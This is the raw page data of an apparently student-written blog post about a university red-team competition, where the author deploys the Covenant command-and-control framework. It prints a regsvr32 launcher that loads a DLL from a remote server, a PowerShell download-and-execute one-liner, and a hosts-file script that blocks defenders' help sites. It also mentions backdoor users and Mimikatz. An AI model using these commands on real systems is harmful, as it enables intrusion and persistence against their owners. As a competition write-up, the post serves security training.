rNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/502b1/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/f2e6d/hunt_lolbas_logo.png 114w,\n/static/e6f5e62a79cd7704687fe00638df8551/4ddba/hunt_lolbas_logo.png 229w,\n/static/e6f5e62a79cd7704687fe00638df8551/502b1/hunt_lolbas_logo.png 457w,\n/static/e6f5e62a79cd7704687fe00638df8551/7ddc2/hunt_lolbas_logo.png 686w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/15384/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/31fce/hunt_lolbas_logo.webp 114w,\n/static/e6f5e62a79cd7704687fe00638df8551/e3e25/hunt_lolbas_logo.webp 229w,\n/static/e6f5e62a79cd7704687fe00638df8551/15384/hunt_lolbas_logo.webp 457w,\n/static/e6f5e62a79cd7704687fe00638df8551/0258d/hunt_lolbas_logo.webp 686w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png"}}},{"id":"ac530db8-6d83-518b-8169-4c44a58ce376","slug":"/Power-of-Covenant","secret":false,"title":"Power of Covenant","author":"NotoriousRebel","date":"May 1st, 2019","dateForSEO":"2019-05-01T00:00:00.000Z","timeToRead":4,"excerpt":"Deploying Covenant","subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Power of Covenant\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2019-05-01T00:00:00.000Z\",\n  \"hero\": \"./images/pwnboard_image.png\",\n  \"excerpt\": \"Deploying Covenant\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h1\", {\n    \"id\": \"using-covenant--red-teaming\"\n  }, \"Using Covenant & Red Teaming\"), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, \"This past weekend, I had my first ever red teaming experience at\\nUniversity of Buffalo called \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://lockdown.ubnetdef.org/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Lockdown\"), \".\\nI knew from the start I would be tackling Windows for this competition;\\nhowever, I wasn\\u2019t sure what I wanted to do. Did I want to use\\nEmpire, Metasploit, maybe Pupy? The answer was none of the above.\\nFor this competition I wanted to try out something new.\"), mdx(\"h3\", {\n    \"id\": \"deploying-covenant\"\n  }, \"Deploying Covenant\"), mdx(\"p\", null, \"I decided to go with \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/cobbr/covenant\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Covenant\"), \".\\nThis is a fairly recent C2 that came out a couple months ago\\nbased on the .NET framework and written in C#. An interesting\\naspect of this C2 is that it\\u2019s divided into two parts, Covenant\\nis the server and \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/cobbr/Elite\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Elite\"), \"\\nis what interacts with the server. The last part is\\njust Grunts, that is just the Implant.\\nOne of the issues I came across when testing this is out is\\nhow long it took to set up, I just wanted to at the start of the competition\\nhit a button and have everything I needed. With some help from\\nDocker I created a docker-compose file to assist me. This\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/covDeploy\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"file\"), \" did the\\nheavy lifting for me. One really awesome aspect of this C2 was\\nthat we could spin up Covenant on one server and when anyone\\nssh\\u2019d onto our server it would docker-compose up Elite for them.\\nThis meant they didn\\u2019t have to download docker-compose and would make\\nthings centralized. \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"539px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"77.36549165120594%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABJ0AAASdAHeZh94AAACEklEQVQ4y4VTTW/TQBTMP0TqAYG48guQOCCgF07cS4Xbqq2ohABB00AgQnBBItBWFZCPUkjdFKjruElsEtfx+ms97K7t1HbS8qRVNu/NjN+83S0gF2EYisWjZ7r4oxMcGQSdgQu5a4t9HpeOwqQgxkDiURS/dLH8UcVKVcWTbQ265f1fMCkkoDT41gsZl+bqmHlQx42nLfjB+Vj+W0hbzVvncbd4gMsPG7gqNXHzmQzXpxfiMx1ysOMFbFGx+H/e4cx8A1ekGmZLTRiWDy9IcBF2osMkwQE0tkDj3O31A1xf3cO9V23crxxi5AYiT1OciwVpdi58btcWd3GHWZ/daMOOBccc5oKeJ+gHdGImO4cmyrUeKo0+ttpDBDTM1L0cp4BUN+pfh921kZhLfvC8s7RYVAsxtD2YxD87lDBFHBAKdeBNFWydEOyf2Bl7PLqnPuqKhYHtx6fMv8Y2mmFBVvrQdDPqJCaMHB8tRcfvjoFT2x2LcWGlbwqOyjjJq2CCbKhsv/GuCmlhAWvPyzBGgbDDQ1Z6mFtag7S0is1mO+axK8VIj0vvGWcRj9bfIjLFBJPWP9R+Yb74CS+r32GLapQ/1i0sv9nByutt/DjSxx3yB1PZakEqfUZ58yei8QrBaLPfdfBVIWiqBD49m53OLvI3lq8dE2hDL2N5T+N5B7sdkn4pIaa8cUT5yUJyulMZrPYPUrR25dOQv+QAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3606e72e109fd5d8d4bc85045496c8ce/5e521/plan.webp 539w\"],\n    \"sizes\": \"(max-width: 539px) 100vw, 539px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3606e72e109fd5d8d4bc85045496c8ce/644b1/plan.png 539w\"],\n    \"sizes\": \"(max-width: 539px) 100vw, 539px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/3606e72e109fd5d8d4bc85045496c8ce/644b1/plan.png\",\n    \"alt\": \"Plan\",\n    \"title\": \"Plan\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"using-covenant\"\n  }, \"Using Covenant\"), mdx(\"p\", null, \"Deployment was trivial all we had to do was docker-compose up.\"), mdx(\"div\", {\n    \"className\": \"Image__Medium\"\n  }, \"\\n  \", mdx(\"span\", _extends({\n    parentName: \"div\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1807px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"52.73934698395129%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABJ0AAASdAHeZh94AAACi0lEQVQozyWS2W7TUBRFr5vJztCQxHbiOE48pSRpk5a0hdBWahGI4QHEA+IP+AqEaGnoXDowSIiPXRw7D0eyfO199177qPnJOYfzU74czfl6/J3Ph8d8O7tkfnGdPh9d/eT+/jcXd785u/nJxe0vzm/uOftxz/zyhpPrO06vb5mfX/Hn7z+U5biojC5joPQqqiCj11DFBipbZrD3ilowQG92MVo+ejoBqib/LTuoko0y6iilE69NUdFghNUJMBoOhumiWx4Fq0vZCSjaHrPX7+lv7RJtbBNPZ8SbT2mPphSciHwrImf75M2OCNcZb++g4tEYrz+iHQ1xV8ZU2hG63VsIWi77bz8QrW/Rkm+81Sn2yoSSt0K2GZKxAzKNDpmak6Zb3XyCagd93HiI2Y1x+mOaMiURLYlgpt5m9vId3dE6VTeg1gkpNANyMongkumzJNGXqi1UvsJaIhgNJzjhAFs4OXJ7zR8KrwWrrOmxvnuAKeeGXFB2xb1EzaXuRLDRRXvQRlsWjvky8WiCejiZstwS4MLOENgJ8HInTgUKdpdgex9LcFTdkGonEQwX7qwAre6hiTutYkqZFRqOhwoljuWvUGolPDxyVo+8MDScJF4XXwSX/QEFOTcERfI+I4KaxNXSppto5Ubq0HSknP5kC19gNwJx0RumjPRWSDEpR2IHj59RFQwFEconcaXZJTsSwZ6sziKuJg2rXFEE5YKBNBiubUqLY+ryY1ZWIC9rozd7ZOsOk+dveRCMUudJGRlZk8Sdqomb6sKdVpTdzeqYTWm7PpnhbB0Q776h8/gF9bWnWJM92psHOBt7zD5+knc76OEG+XBKxn+E5q2jOQO0hKPE1iqWRC5hux7/AUZ3OKi0KW0lAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/9fc5b60b750c946791dd685a9ec537d6/18831/easy_deployment.webp 1807w\"],\n    \"sizes\": \"(max-width: 1807px) 100vw, 1807px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/9fc5b60b750c946791dd685a9ec537d6/7be35/easy_deployment.png 1807w\"],\n    \"sizes\": \"(max-width: 1807px) 100vw, 1807px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/9fc5b60b750c946791dd685a9ec537d6/7be35/easy_deployment.png\",\n    \"alt\": \"Easy-Deployment\",\n    \"title\": \"Easy-Deployment\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \"), \"\\n  \", mdx(\"h4\", {\n    parentName: \"div\"\n  }, \"Docker commands to run to covenant \")), mdx(\"p\", null, \"In reality we would want to tack on -d when composing Covenant\\nto background it.\\nUsing powershell with a remote session would be too noisy,\\nextremely easy to notice, and trivial to kill.\\nTo make things stealthier I decided to go with registering a dll and utilizing Regsvr32.\\nAs Regsvr32 is developed by Microsoft and in apart of System32\\nit would look a lot less suspicious. However, this requires\\nthe dotnet framework to be installed on the target machine.\\nLuckily this is a oneliner that doesn\\u2019t require a restart.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"Add-WindowsCapability \\u2013Online -Name NetFx3~~~~ \\u2013Source D:\\\\sources\\\\sxs\\n\")), mdx(\"p\", null, \"The launcher is just a simple one liner, and the icing on the cake\\nis that we can have our server host the dll file instead of having to get that file\\non the target machine.\"), mdx(\"div\", {\n    \"className\": \"Image__Medium\"\n  }, \"\\n  \", mdx(\"span\", _extends({\n    parentName: \"div\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1520px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"47.17105263157894%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAABJ0AAASdAHeZh94AAAB0klEQVQozzWQ6W7aQBSFB0xsMGbzOh7vMzbeGGxDMEmUtK8QiUgRVSSiqmuCKqKmKOnyo1IfvEOqSufn/e537gVd1RyYjuwQFE9VkhsRRUlhZ5WTz9JZnVSLcbkgxXEbhTwkR5BwOj7SfCAq9OQ1GCHXSymKJmFZB0WNyyWZnUTz03x5Xp1dWPmMxckq8QVuGYTTgpbqgY5Ml6+ApFt96PUQZloF5wrJtXCihzkcUyelMExhmKlBIpgv2gPsc4oL2iNaXwBRt1vQa5mBZIWCEfC6Jxh+G/odhLsWlizStUjfIhIirZfOTdXjZAcIA1qfg57pOVmpkMzKKjnIWFgFlcnHlMn18VSNqBJOR0HGtE0Gyy43QkDo08UZGNokqmoUl2xOgEHHxCLz2GHPiVi6diRa0b9vNXXSUP3GyD7AfG9yfAok6Osk67txm12leR2I/9c+LBJMzEPM6QFzNjQMZBcMUXMAASdSBhtJoSTlMJsPksqkC7tYGvn8kLhQwknPSyU3FZ20bae8FfMw5DVfUO1GV46nc/Dh8efNw/frr782T7/vfvxZb79tds+bh+fN7unmy/7Ndr++31/f7a8+71cfH1fvd6u326vbT5fr23f3u787BU4XtShSlAAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/24c43eb13cf07214fd80d34f12bae877/39675/launcher.webp 1520w\"],\n    \"sizes\": \"(max-width: 1520px) 100vw, 1520px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/24c43eb13cf07214fd80d34f12bae877/d4c50/launcher.png 1520w\"],\n    \"sizes\": \"(max-width: 1520px) 100vw, 1520px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/24c43eb13cf07214fd80d34f12bae877/d4c50/launcher.png\",\n    \"alt\": \"Launcher\",\n    \"title\": \"Launcher\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \"), \"\\n  \", mdx(\"h4\", {\n    parentName: \"div\"\n  }, \"Using regsvr32 as our launcher \")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"regsvr32 /u /s /i:http://129.21.228.140/demo.dll scrobj.dll\\n\")), mdx(\"p\", null, \"/u: Unregister server calling DllRegisterServer\"), mdx(\"p\", null, \"/s: Silent: display no message boxes.\"), mdx(\"p\", null, \"/i: Since used with /u calls Dll uninstall\"), mdx(\"p\", null, \"scobj.dll: Is the Dllname that the entry points on.\"), mdx(\"p\", null, \"Once ran on the target machine we get a nice beacon back\\nand can have some fun. For the competition one of the most important\\nthings to do is maintain persistence. Making sure to add backdoor\\nusers, firewall rules, scheduled tasks, and services were essential.\\nOne service that was critical is WinRM to allow us to remotely run\\nscripts. Making sure it was running was quite simple with\\nCovenant.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"854px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"14.8711943793911%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAABJ0AAASdAHeZh94AAAAsklEQVQI1y2O226DMBAFkR3AJEKBAAZsLgablKT9/9+bWm0eRtqHPaNJ7oOh7C2iHRD9hLAOaRy30fHYTip3Ukaq/Zt6f3N3X1ztTj4fKOspekcxOEqzYVwgafwRHw/EvCH8ifQvLuFNEYfZHMiWJ6l7ka0nKvyQxzsdo3AKKOP/ZCrSLZ563klujeb60Iiqi5UG2VmknknbWF2PyGZCtguXbiXV/+Qf1KeuGDb06qmi8BcB9EvtCTX2LQAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/08435ddb152b4c67cb5743f0976bc7a9/565b8/example_powershell.webp 854w\"],\n    \"sizes\": \"(max-width: 854px) 100vw, 854px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/08435ddb152b4c67cb5743f0976bc7a9/89c55/example_powershell.png 854w\"],\n    \"sizes\": \"(max-width: 854px) 100vw, 854px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/08435ddb152b4c67cb5743f0976bc7a9/89c55/example_powershell.png\",\n    \"alt\": \"Restarting_Winrm\",\n    \"title\": \"Restarting_Winrm\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Although, in most cases we had those commands in a powershell\\nfile hosted somewhere so we were able to simply do. \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"(IWR -Uri \\\"https://hostingsite.com\\\" -UseBasicParsing).Content | IEX\\n\")), mdx(\"p\", null, \"IWR: Invoke-WebRequest\"), mdx(\"p\", null, \"IEX: Invoke-Expression\"), mdx(\"p\", null, \"It was also fun messing with them by doing very basic things\\nsuch as messing with the hosts file in Windows.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"    $hosts_path = \\\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\\\"\\n    $local = \\\"127.0.0.1\\\"\\n    $text = @\\\"\\n    $local      github.com\\n    $local      termbin.com\\n    $local      pastebin.com\\n    $local      tinyurl.com\\n    $local      bitly.com \\n    $local      google.com\\n    $local  stackoverflow.com\\n    $local  raw.githubusercontent.com\\n    $local  chocolatey.org\\n    $local  docs.microsoft.com\\n    $local  wireshark.org\\n\\\"@ \\n    Add-Content -Path $hosts_path -Value $text\\n\")), mdx(\"p\", null, \"Of course Covenant had some nice features such as\\nGetSystem which allowed us to run things at System level. While\\nalso having standard things such as Mimikatz and Registry\\nmanipulation. However, a pretty unique feature was the integration of allowing\\npeople to run C# sharp code.\"), mdx(\"h3\", {\n    \"id\": \"customization\"\n  }, \"Customization\"), mdx(\"p\", null, \"Covenant on it\\u2019s own is great; however, as part of the\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/RITRedTeam\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"RITSECRedTeam\"), \" we like to keep track of things.\\nOne of the most important things is the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/micahjmartin/pwnboard\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"pwnboard\"), \".\\nThe pwnboard is a visualization to keep track of what we have control of and to\\nsee what teams are giving us trouble.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1899px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"42.33807266982622%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABOklEQVQoz01QSU7DQBD0D0i8TewAcQQCxCJuKOGARCAXrvERhcCBd+BlDLw4HttS08s44VCqqe4aVamd05s7SOYpTOYr5sTyZLbCWcrvy6c1XC83PEvsTP6kOw9hep+Cc7X8gFgbGJW1ZcOsSsFRVUOYb2FUbFlHmvZ7L2GMnrgyMP014JwtNhCWLfiFBb49ZLcQVlrmSnfMod1HVcc70oSg7GD83YJz+/LJyX5eQ1AYCC0CC2oTFjV7aN57qVloZ5EWffxDDR/XtmGDKYQ+URBXDWqEbnc78iq990Ra9ofU8OL5HdzMwOBLcIAYZsIDZA/bDJll33vdXHwEPxftY1vn5OGV07y84RsF/+5JbRSmB7aRZ+fk7X1yZ9FRhQ3PF2+SkNXcgrBLRKiCbiv3pZ2waN/6VSma7vgHxoKDt3dlm1QAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b14d7f60911c39c74299be7a98856cc2/2190f/pwnboard.webp 1899w\"],\n    \"sizes\": \"(max-width: 1899px) 100vw, 1899px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b14d7f60911c39c74299be7a98856cc2/3254a/pwnboard.png 1899w\"],\n    \"sizes\": \"(max-width: 1899px) 100vw, 1899px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/b14d7f60911c39c74299be7a98856cc2/3254a/pwnboard.png\",\n    \"alt\": \"pwnboard-blue\",\n    \"title\": \"pwnboard-blue\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"To show that you have control of a box is a mere post request with\\njson that contains the ip and type of beacon. There is one obvious problem,\\nCovenant doesn\\u2019t automatically do this. That\\u2019s ok I was planning on\\nlearning C#. After talking to the developer to figure out where to\\nmake the post request to pwnboard whenever a Grunt was created.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"890px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"54.26966292134831%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABJ0AAASdAHeZh94AAAByklEQVQoz21S2ZLbMAzb74glS7J1WIfvpLuZbfv/f4VCapM2nX3A8NAIJEi+aW1gQoEtM9w8w6aM5cg4bwW39wXhKHA32rMg7CuW64nR8Y/VMKOGlBJ93z/xprWmI+CShs8GLmrYPEBZBdFLCCEgKyTBuFcCSitoo5r9ktCwyzhFGDdi8BbjqGANifnmBoORHx1jo3oWkOg6AdGJJ1m1D78RKjqDneD37yjvPyn5hvte8OOc8a1E3I8Nn9cd93PHVhKLO1g7QqnXDqV8SpbsbMK0f1D6gnj9QNlWpGWBnTPc9Yq4HbCRvvdI0SPGgPr3lVD+6ZCVNNHXBbkAOyXmDKSyv2Pv2NUIxyV0lwsul66h42zrCNqcXyRXslqF1s8HwrZjyJHICPOKkAom+nndMIYIR7kT5x2qtQO8s0/5fwk5cGP4mDfkpaDsGWVN2OaCOaWGc11RciKBw7JfMTM+lojzXOGYq502wnqLyScME+fCgetakdWNtW0UQnTtdB62diJaLChbNtl1Dy+Sg4+YuN3MbRYec94KFm60TL7JSpQYWaTazNOag4UfOfNhQEwTZl7DFALejGGSeGyp/wr/HG6F+i9uOdW3xn4B+o83qJ40UpsAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3f8773f032f33b909b35948adf617d86/b1cab/post_topwnboard.webp 890w\"],\n    \"sizes\": \"(max-width: 890px) 100vw, 890px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3f8773f032f33b909b35948adf617d86/91293/post_topwnboard.png 890w\"],\n    